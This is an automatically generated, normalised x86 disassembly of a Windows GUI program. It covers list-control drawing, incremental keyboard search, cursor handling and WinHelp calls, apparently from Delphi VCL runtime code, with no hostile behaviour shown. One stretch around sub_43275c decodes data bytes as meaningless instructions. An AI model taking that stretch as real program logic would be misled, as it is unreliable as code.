mov [ ebx + 0x234 ] 0xffffffff
mov edx esi
mov eax [ ebx + 0x218 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
lea eax [ ebx + 0x240 ]
call sub_40cb64
sub_431adc
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
mov eax ebx
call sub_43c5c4
pop esi
pop ebx
retn
mov al [ ebx + 0x238 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov esi eax
mov [ ebx + 0x240 ] esi
mov edx [ ebx + 0x218 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebx + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebx + 0x234 ] eax
jmp r-xdata
mov eax ebx
call sub_43160c
mov [ ebx + 0x244 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov [ ebx + 0x248 ] eax
sub_431b58
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov edx esi
mov eax ebx
call sub_43cc3c
mov edi [ esi ]
cmp edi 0x201
je r-xdata
mov eax ebx
call sub_4391b0
test al al
jne r-xdata
cmp edi 0x203
jne r-xdata
cmp [ ebx + 0x5d ] 0x1
jne r-xdata
mov edx esi
mov eax ebx
call sub_43cba8
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov ax [ r-xdata ]
or ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x14 ]
jmp r-xdata
sub_431bbe
add [ eax ] al
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov edi edx
mov esi eax
mov ax [ edi + 0x4 ]
call sub_44f670
mov ebx eax
cmp [ esi + 0x5d ] 0x1
jne r-xdata
mov edx edi
mov eax esi
call sub_43a0c4
cmp [ esi + 0x5d ] 0x1
jne r-xdata
cmp [ esi + 0x208 ] 0x0
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x208 ] 0x0
je r-xdata
test bl 0x1
je r-xdata
or ecx 0xffffffff
xor edx edx
mov eax esi
call sub_4390e8
test bl 0x4
jne r-xdata
mov edx esp
mov eax [ edi + 0x8 ]
call sub_4068a0
mov edx esp
mov cl 0x1
mov eax esi
call sub_431804
mov ebp eax
test ebp ebp
jl r-xdata
test bl 0x4
je r-xdata
test bl 0x1
jne r-xdata
mov edx ebp
mov eax esi
call sub_4314ac
test al al
je r-xdata
or ecx 0xffffffff
xor edx edx
mov eax esi
call sub_4390e8
jmp r-xdata
sub_431c5c
push esi
mov esi eax
mov ax [ edx + 0x6 ]
dec ax
je r-xdata
mov eax esi
call sub_43864c
mov eax esi
mov si 0xffeb
call sub_403454
pop esi
retn
dec ax
je r-xdata
mov eax esi
mov si 0xffe9
call sub_403454
jmp r-xdata
pop esi
retn
sub_431c90
push ebp
mov ebp esp
add esp 0xffffff70
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
mov [ ebp - 0x18 ] 0xbc2b
lea eax [ ebp - 0x58 ]
mov [ ebp - 0x10 ] eax
mov eax [ edi ]
call sub_43f228
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x58 ] 0x2
mov [ ebp - 0x4c ] 0x1
xor eax eax
mov [ ebp - 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x40 ] eax
mov eax [ edi ]
call sub_43f228
mov [ ebp - 0x54 ] eax
mov eax [ edi ]
call sub_43f228
mov [ ebp - 0x44 ] eax
mov [ ebp - 0x28 ] 0xbc2c
mov eax [ edi ]
call sub_43f228
mov [ ebp - 0x24 ] eax
lea eax [ ebp - 0x70 ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x70 ] 0x2
mov eax [ edi ]
call sub_43f228
mov [ ebp - 0x6c ] eax
xor esi esi
mov eax [ edi ]
call sub_43160c
mov ebx eax
lea eax [ ebp - 0x80 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call GetClipBox
mov eax [ edi ]
mov eax [ eax + 0x4c ]
mov [ ebp - 0x4 ] eax
mov eax [ edi ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x8 ] eax
cmp esi [ ebp - 0x4 ]
jge r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x68 ] ebx
mov eax [ edi ]
mov eax [ eax + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp ebx eax
jge r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x64 ] eax
mov eax [ edi ]
mov eax [ eax + 0x230 ]
mov [ ebp - 0x60 ] eax
mov eax [ ebp - 0x5c ]
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x50 ] ebx
lea edx [ ebp - 0x28 ]
mov eax [ edi ]
mov ecx [ eax ]
call [ ecx - 0x14 ]
mov eax [ ebp - 0x60 ]
add eax esi
push eax
lea eax [ ebp - 0x90 ]
push eax
mov ecx [ ebp - 0x64 ]
mov edx esi
xor eax eax
call sub_412378
push esi
push edi
lea esi [ ebp - 0x90 ]
lea edi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
lea edx [ ebp - 0x18 ]
mov eax [ edi ]
mov ecx [ eax ]
call [ ecx - 0x14 ]
add esi [ ebp - 0x60 ]
inc ebx
mov eax [ edi ]
mov eax [ eax + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp ebx eax
jge r-xdata
mov eax [ edi ]
mov eax [ eax + 0x218 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ ebp - 0x5c ] eax
cmp esi [ ebp - 0x4 ]
jl r-xdata
sub_431df0
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_43d3b8
push ebp
call sub_431c90
pop ecx
jmp r-xdata
pop ecx
pop ecx
pop ebp
retn
sub_431e34
push ebx
add esp 0xffffffe0
mov ebx eax
mov [ esp + 0x8 ] 0x201
push esp
call GetCursorPos
lea ecx [ esp + 0x18 ]
mov edx esp
mov eax ebx
call sub_438584
lea eax [ esp + 0x18 ]
call sub_4068b4
mov [ esp + 0x10 ] eax
xor eax eax
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x14 ] eax
lea edx [ esp + 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov [ esp + 0x8 ] 0x202
lea edx [ esp + 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
add esp 0x20
pop ebx
retn
sub_431e94
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov esi ecx
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_431fa0
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x252 ] 0x0
je r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ ebx + 0x228 ]
call sub_41d014
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc8 ]
cmp edi eax
jge r-xdata
lea eax [ ebp - 0x18 ]
push eax
mov ax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx ebx
mov eax [ ebx + 0x254 ]
call [ ebx + 0x250 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_431fa7
lea eax [ ebp - 0x8 ]
call sub_403f90
retn
mov edx 0x824
mov eax ebx
call sub_43ad20
mov [ ebp - 0x4 ] eax
mov eax ebx
mov si 0xffc8
call sub_403454
test al al
jne r-xdata
sub [ ebp - 0x10 ] 0x2
add [ ebp - 0x18 ] 0x2
jmp r-xdata
lea ecx [ ebp - 0x8 ]
mov edx edi
mov eax [ ebx + 0x218 ]
mov esi [ eax ]
call [ esi + 0xc ]
lea ecx [ ebp - 0x8 ]
mov edx edi
mov eax ebx
call sub_4324b8
jmp r-xdata
lea eax [ ebp - 0x8 ]
call sub_403f90
mov al [ ebx + 0x238 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
call sub_404250
push eax
mov eax [ ebp - 0x8 ]
call sub_404450
push eax
mov eax [ ebx + 0x228 ]
call sub_41d438
push eax
call DrawTextA
sub_431fd0
push ebx
push esi
push edi
push ebp
mov esi eax
mov edi [ edx + 0x8 ]
mov bp [ edi + 0x10 ]
mov edx [ edi + 0x18 ]
mov eax [ esi + 0x228 ]
call sub_41d4b8
mov edx [ esi + 0x68 ]
mov eax [ esi + 0x228 ]
call sub_41d358
mov edx [ esi + 0x170 ]
mov eax [ esi + 0x228 ]
call sub_41d374
cmp [ edi + 0x8 ] 0x0
jl r-xdata
cmp [ edi + 0x8 ] 0x0
jl r-xdata
test bp 0x1
je r-xdata
lea edx [ edi + 0x1c ]
mov eax [ esi + 0x228 ]
call sub_41d014
push ebp
lea ecx [ edi + 0x1c ]
mov edx [ edi + 0x8 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0xf8 ]
jmp r-xdata
mov eax [ esi + 0x228 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000d
call sub_41c9b0
mov eax [ esi + 0x228 ]
mov eax [ eax + 0xc ]
mov edx 0xff00000e
call sub_41c1e4
xor edx edx
mov eax [ esi + 0x228 ]
call sub_41d4b8
pop ebp
pop edi
pop esi
pop ebx
retn
lea eax [ edi + 0x1c ]
push eax
mov eax [ edi + 0x18 ]
push eax
call DrawFocusRect
test bp 0x10
je r-xdata
sub_43208c
push ebx
push esi
push edi
mov esi eax
mov edi [ edx + 0x8 ]
mov eax [ esi + 0x230 ]
mov [ edi + 0x10 ] eax
cmp [ esi + 0x238 ] 0x2
jne r-xdata
pop edi
pop esi
pop ebx
retn
lea ecx [ edi + 0x10 ]
mov edx [ edi + 0x8 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0xfc ]
sub_4320bc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_43e840
pop esi
pop ebx
retn
cmp [ ebx + 0x224 ] 0x1
jne r-xdata
mov eax ebx
call sub_43c7c8
sub_4320e8
push ebx
push esi
push edi
mov esi eax
cmp [ esi + 0x208 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor edi edi
mov cl 0x1
mov edx edi
mov eax esi
call sub_4314fc
inc edi
dec ebx
jne r-xdata
sub_432120
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov al [ eax + 0x238 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x21c ]
call sub_404450
push eax
push 0xffffffff
push 0x18f
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_43f228
push eax
call SendMessageA
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x21c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_432500
mov ebx eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov al [ eax ]
sub al 0x8
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x208 ] 0x0
je r-xdata
cmp ebx 0xffffffff
je r-xdata
pop esi
pop ebx
pop ebp
retn
sub al 0x5
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0xd0 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov si 0xffeb
call sub_403454
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax ]
call [ edx + 0xdc ]
mov esi ebx
mov edx esi
mov eax esi
call sub_4068d4
push eax
push 0x1
push 0x19b
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_43f228
push eax
call SendMessageA
sub al 0xe
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov [ eax ] 0x0
sub_432204
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x28 ] ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
lea ebx [ ebp - 0x4 ]
xor eax eax
push ebp
push sub_4323c4
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax [ ebx ]
call sub_43e20c
mov eax [ ebx ]
cmp [ eax + 0x210 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4323cb
lea eax [ ebp - 0x30 ]
mov edx 0x3
call sub_403fb4
retn
call GetTickCount
mov edx [ ebx ]
sub eax [ edx + 0x220 ]
cmp eax 0x1f4
jb r-xdata
call GetTickCount
mov edx [ ebx ]
mov [ edx + 0x220 ] eax
mov eax [ ebp - 0x8 ]
mov al [ eax ]
cmp al 0x8
je r-xdata
mov eax [ ebx ]
add eax 0x21c
call sub_403f90
mov eax [ ebx ]
mov eax [ eax + 0x21c ]
call sub_404250
mov edx eax
mov eax [ ebx ]
mov eax [ eax + 0x21c ]
call sub_40bc38
cmp al 0x2
je r-xdata
mov eax [ ebp - 0x8 ]
mov al [ eax ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x21c ]
call sub_404250
mov edx eax
mov eax [ ebx ]
add eax 0x21c
mov ecx 0x1
call sub_4044f0
mov eax [ ebx ]
mov eax [ eax + 0x21c ]
call sub_404250
mov edx eax
mov eax [ ebx ]
add eax 0x21c
mov ecx 0x1
call sub_4044f0
lea eax [ ebp - 0x30 ]
mov edx [ ebp - 0x8 ]
mov dl [ edx ]
call sub_404178
mov edx [ ebp - 0x30 ]
mov eax [ ebx ]
add eax 0x21c
call sub_404258
jmp r-xdata
push 0x1
push 0x102
push 0x102
mov eax [ ebx ]
call sub_43f228
push eax
lea eax [ ebp - 0x24 ]
push eax
call PeekMessageA
test eax eax
je r-xdata
xor edx edx
mov eax [ ebx ]
mov ecx [ eax ]
call [ ecx + 0xd0 ]
mov eax [ ebx ]
mov si 0xffeb
call sub_403454
push ebp
call sub_432120
pop ecx
jmp r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x21c ]
call sub_404250
test eax eax
jle r-xdata
mov eax [ ebx ]
push [ eax + 0x21c ]
lea eax [ ebp - 0x28 ]
mov edx [ ebp - 0x8 ]
mov dl [ edx ]
call sub_404178
push [ ebp - 0x28 ]
lea eax [ ebp - 0x2c ]
mov edx [ ebp - 0x1c ]
call sub_404178
push [ ebp - 0x2c ]
mov eax [ ebx ]
add eax 0x21c
mov edx 0x3
call sub_404310
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x0
jmp r-xdata
sub_4323d4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4324a8
push [ fs : eax ]
mov [ fs : eax ] esp
mov al [ ebx + 0x238 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405a90
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b2c0
call sub_4039cc
push 0x0
push esi
push 0x1a7
mov eax ebx
call sub_43f228
push eax
call SendMessageA
cmp eax 0xffffffff
je r-xdata
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405a90
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b2c0
call sub_4039cc
jmp r-xdata
cmp eax 0xfffffffe
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4324af
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403fb4
retn
mov [ ebx + 0x214 ] esi
jmp r-xdata
sub_4324d8
push ebx
push ecx
cmp [ eax + 0x272 ] 0x0
je r-xdata
mov eax [ esp ]
pop edx
pop ebx
retn
push esp
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x274 ]
call [ ebx + 0x270 ]
sub_432500
push ebx
cmp [ eax + 0x26a ] 0x0
je r-xdata
or eax 0xffffffff
pop ebx
retn
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x26c ]
call [ ebx + 0x268 ]
pop ebx
retn
sub_432524
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_432549
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_432550
retn
sub_432650
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4450f4
mov [ esi + 0x60 ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403564
mov eax esi
pop esi
pop ebx
retn
call sub_4035bc
pop [ fs : 0x0 ]
add esp 0xc
sub_43268c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4326b1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4326b8
retn
sub_43275c
cmp eax 0x47004327
daa
inc ebx
add [ ecx + 0x27 ] dl
inc ebx
add ch dh
inc ebx
add ch bh
inc ebx
add [ 0xd004327 ] al
daa
inc ebx
add [ 0x1d004327 ] dl
daa
inc ebx
add [ 0x2d004327 ] ah
daa
inc ebx
add [ 0xffffffffd5004327 ] dh
inc edi
cmp bl [ edi + 0x43 ]
add [ eax ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi - 0x6d ] ah
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
inc ebx
add ch bl
inc ebx
add ch ah
inc ebx
add ch ch
sbb eax 0x25004327
daa
inc ebx
add [ 0x35004327 ] ch
daa
inc ebx
add ch dl
cmp bl [ edi + 0x43 ]
add [ eax ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + edx * 4 - 0x4 ] ah
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
inc ebx
add ch cl
inc ebx
add [ ebx ] al
add [ eax ] al
add [ esi - 0x6d ] ah
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
in eax dx
cmp bl [ edi + 0x43 ]
add [ eax ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + ebp + 0x43 ] al
add [ eax + 0x4327 ] ah
add [ eax ] al
add [ eax + ebp + 0x43 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x28 ] bl
inc ebx
add [ eax + eax ] ah
add [ eax ] al
xchg esp eax
adc [ eax ] eax
mov [ eax + eax * 2 ] dh
add [ esi + edx * 2 + 0x40 ] cl
add [ eax + 0x56 ] bl
inc eax
add [ esp + esi + 0x34900040 ] bl
inc eax
add [ eax + 0x56 ] ch
inc eax
add [ edx + esi ] cl
inc eax
add ah ah
xor al [ ebx ]
push cs
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + edx + 0x140040 ] dl
add [ eax ] al
fsubr [ ebx ]
inc edx
add [ eax + eax ] bl
add [ eax ] al
push cs
push esp
push edi
imul ebp [ esi + 0x48 ] 0x56706c65
imul esp [ ebp + 0x77 ] 0x408d7265
add [ ebp - 0x75 ] dl
in al dx
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_432925
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_403f90
test edi edi
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx edi
call sub_404028
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_403fe4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43292c
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fb4
retn
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
push [ ebp - 0x8 ]
push r-xdata
push [ ebp - 0x4 ]
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_404310
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
sub_432870
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_432925
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_403f90
test edi edi
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx edi
call sub_404028
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_403fe4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43292c
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fb4
retn
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
push [ ebp - 0x8 ]
push r-xdata
push [ ebp - 0x4 ]
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_404310
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
sub_432940
push ebx
mov ebx eax
mov eax ebx
call sub_432c70
cmp [ ebx + 0x1c ] 0x0
je r-xdata
pop ebx
retn
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
lea eax [ ebx + 0x1c ]
call sub_4055cc
sub_43297c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4329e3
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov ebx 0x1
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax ebx
call sub_432870
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx + 0xc ]
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
mov ebx 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4329ea
lea eax [ ebp - 0x4 ]
call sub_403f90
retn
sub_4329f4
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_432a7c
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov ebx eax
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_432968
push [ ebp - 0x8 ]
push r-xdata
push edi
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_404310
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx edi
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_432a83
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fb4
retn
sub_432a8f
inc [ edx ]
add [ eax ] al
add [ edx ] bh
and [ eax ] al
add [ eax + 0x5590c301 ] dh
mov ebp esp
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_432b17
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_4331b4
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_432b1e
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fb4
retn
mov [ ebx + 0x10 ] 0x2
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x8 ]
lea ecx [ ebp - 0x4 ]
mov eax ebx
call sub_432870
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push 0x0
push 0x3
mov eax [ ebp - 0x4 ]
call sub_404450
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_432a9c
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_432b17
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_4331b4
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_432b1e
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fb4
retn
mov [ ebx + 0x10 ] 0x2
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x8 ]
lea ecx [ ebp - 0x4 ]
mov eax ebx
call sub_432870
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push 0x0
push 0x3
mov eax [ ebp - 0x4 ]
call sub_404450
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_432b24
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_432c1c
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
jne r-xdata
lea eax [ ebp - 0x4 ]
push eax
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x14 ] 0xb
lea ecx [ ebp - 0x1c ]
xor edx edx
mov eax ebx
call sub_432870
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov ecx 0x1
mov eax r-xdata
call sub_408a04
mov eax ebx
call sub_4331b4
test al al
je r-xdata
mov ecx sub_4326c4
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b340
call sub_4039cc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_432c23
lea eax [ ebp - 0x1c ]
call sub_403f90
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fb4
retn
lea ecx [ ebp - 0x8 ]
xor edx edx
mov eax ebx
call sub_432870
push 0x0
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax ebx
call sub_43310c
test al al
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov [ ebx + 0x10 ] 0x1
lea eax [ ebx + 0x14 ]
mov edx [ ebp - 0x4 ]
call sub_403fe4
mov eax [ ebp - 0x4 ]
call sub_404450
push eax
push 0x102
mov eax [ ebp - 0x8 ]
call sub_404450
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_432c8c
push ebx
mov ebx eax
mov eax ebx
call sub_432c70
cmp [ ebx + 0x1c ] 0x0
je r-xdata
